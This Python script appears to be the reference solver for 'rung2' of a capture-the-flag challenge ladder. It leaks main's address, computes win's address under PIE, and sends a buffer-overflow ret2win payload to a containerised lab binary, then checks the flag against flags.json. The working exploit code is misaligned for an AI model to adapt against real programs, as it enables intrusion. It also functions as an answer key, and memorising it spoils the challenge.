#!/usr/bin/env python3
"""Known-good exploit for rung2 (ret2win under PIE) — proof of solvability.

The banner leaks main's runtime address; nm gives the constant file offsets of
main and win, so win = leak - off(main) + off(win). ASLR re-randomizes per
exec, so the leak must be read and the payload delivered in the SAME process —
a tiny python3 driver inside the container does that (read banner line, then
write the payload to the still-open stdin). The offset to the saved return
address is rediscovered via De Bruijn + gdb (same primitive as rung1).

Usage: python3 solve_rung2.py <container_id_or_name>
Exit code 0 on PASS, 1 on FAIL.
"""
import json
import os
import re
import subprocess
import sys

from solve_rung1 import discover_offset, docker_exec

HERE = os.path.dirname(os.path.abspath(__file__))


def nm_offset(cid, sym):
    r = docker_exec(cid, ["nm", "/target/rung2"])
    m = re.search(rb"^([0-9a-f]+) [Tt] %s$" % sym.encode(), r.stdout, re.M)
    if not m:
        raise RuntimeError("symbol %s not found in nm output" % sym)
    return int(m.group(1), 16)


def solve(cid):
    flags = json.load(open(os.path.join(HERE, "flags.json")))
    expected = flags["rung2"]

    off_main = nm_offset(cid, "main")
    off_win = nm_offset(cid, "win")
    print("[*] nm offsets: main=0x%x win=0x%x (delta=0x%x)" % (off_main, off_win, off_win - off_main))

    # Offset to saved return address (De Bruijn + gdb), same as rung1.
    offset = discover_offset(cid, "/target/rung2")
    print("[*] ret-offset %d" % offset)

    # One in-container process: read the banner leak, compute win from it,
    # deliver the payload to the same process's stdin.
    driver = (
        "import subprocess,struct,sys\n"
        "p=subprocess.Popen(['/target/rung2'],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n"
        "banner=p.stdout.readline().decode()\n"
        "sys.stdout.write(banner);sys.stdout.flush()\n"
        "leak=int(banner.split('main: ')[1].strip(),16)\n"
        + ("win=leak-0x%x+0x%x\n" % (off_main, off_win))
        + "sys.stdout.write('computed win=0x%x\\n'%win)\n"
        + ("p.stdin.write(b'A'*%d+struct.pack('<Q',win))\n" % offset)
        + "p.stdin.flush()\n"
        "sys.stdout.write(p.stdout.read().decode())\n"
    )
    r = subprocess.run(["docker", "exec", "-i", cid, "python3", "-c", driver],
                       capture_output=True, timeout=60)
    out = r.stdout
    print("[*] driver output:\n" + out.decode(errors="replace").strip())
    got = re.search(rb"flag\{[^}]*\}", out)
    if got and got.group(0).decode() == expected:
        print("PASS: rung2 solved, flag matches flags.json: %s" % expected)
        return True
    print("FAIL: expected %s, got %s" % (expected, got.group(0).decode() if got else None))
    return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(__doc__)
        sys.exit(2)
    sys.exit(0 if solve(sys.argv[1]) else 1)
